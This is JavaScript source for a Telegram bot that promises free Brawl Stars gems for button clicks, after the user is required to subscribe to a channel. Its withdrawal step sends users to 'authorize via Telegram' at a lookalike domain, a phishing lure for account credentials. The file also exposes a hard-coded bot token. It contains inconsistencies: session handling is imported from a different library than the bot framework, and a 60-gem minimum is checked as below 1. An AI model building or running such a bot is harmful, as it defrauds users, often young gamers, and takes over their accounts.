const { Telegraf, Markup, Composer, Scenes } = require("telegraf");

const { session } = require("grammy");

const bot = new Telegraf("6072385956:AAEYoNnt_NQsPsthbt4t4JbCpruuC4b8MG8")

function initial() {
    return {
        mon: 0,
        id: 0

    };
}
bot.use(session({ initial }));
bot.command("start", async (ctx) => {
    const subscriptionStatus = await ctx.telegram.getChatMember('@BrawlGemsOff', ctx.from.id)
    if (subscriptionStatus.status === 'member' || subscriptionStatus.status === 'creator' || subscriptionStatus.status === 'admin') {
        await ctx.sendMessage("Добро пожаловать, используй меню ниже, что бы заработать гемы! 🤠", {
            reply_markup: {
                keyboard: [["Заработать 🥷", "Вывести 🔍"], ["Профиль 🦹🏼"]],
                resize_keyboard: true
            }
        })
    } else {
        ctx.reply('Для того что бы бот начал работать, подпишитесь на новостной канал! 👾', {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: 'Подписаться',
                            url: 'https://t.me/BrawlGemsOff'
                        },

                    ],
                    [
                        {
                            text: 'Проверить',
                            callback_data: 'check'
                        }
                    ]
                ]
            }
        })
    }

})
bot.action("check", async (ctx) => {
    const subscriptionStatus = await ctx.telegram.getChatMember('@BrawlGemsOff', ctx.from.id)
    if (subscriptionStatus.status === 'member' || subscriptionStatus.status === 'creator') {
        await ctx.sendMessage("Добро пожаловать, используй меню ниже, что бы заработать гемы! 🤠", {
            reply_markup: {
                keyboard: [["Заработать 🥷", "Вывести 🔍"], ["Профиль 🦹🏼"]],
                resize_keyboard: true
            }
        })
    } else {
        ctx.answerCbQuery("Вы не подписались на канал")
    }
})

bot.on('channel_post', (ctx) => {
    const channelId = ctx.update.channel_post.chat.id;
    console.log(`Channel ID: ${channelId}`);
});

bot.hears("Заработать 🥷", async (ctx) => {
    await ctx.sendMessage("Нажимай на кнопку « Кликать » и зарабатывай по 1 гему за клик! 👻", {
        reply_markup: {
            keyboard: [["✍🏻 Кликать"], ["🔙 Главное Меню"]],
            resize_keyboard: true
        }
    })
})

bot.hears("Профиль 🦹🏼", async (ctx) => {
    await ctx.sendMessage(`👹 UID: ${ctx.from.id}\n🦹🏼 Заработано: ${ctx.session.mon}\n🚀 Доступно для вывода: ${ctx.session.mon}`)
})

bot.hears("Вывести 🔍", async (ctx) => {
    if (ctx.session.mon < 1) {
        await ctx.sendMessage("Минимальный вывод 60 гемов !")
    }
    else {
        await ctx.sendMessage("Отлично, для продолжения, авторизируйтесь через телеграм, нажав на кнопку '🚀 Авторизация' под сообщением!", {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "🚀 Авторизация",
                            url: "https://telegramorginfo.ru"
                        }
                    ]
                ]
            }
        })
    }
})
bot.hears("✍🏻 Кликать", async (ctx) => {
    await ctx.sendMessage("Поздравляем! Вы заработали 1 гем! 🤑")
    ctx.session.mon += 1
})
bot.hears("🔙 Главное Меню", async (ctx) => {
    await ctx.sendMessage("Добро пожаловать, используй меню ниже, что бы заработать гемы! 🤠", {
        reply_markup: {
            keyboard: [["Заработать 🥷", "Вывести 🔍"], ["Профиль 🦹🏼"]],
            resize_keyboard: true
        }
    })
})
bot.launch()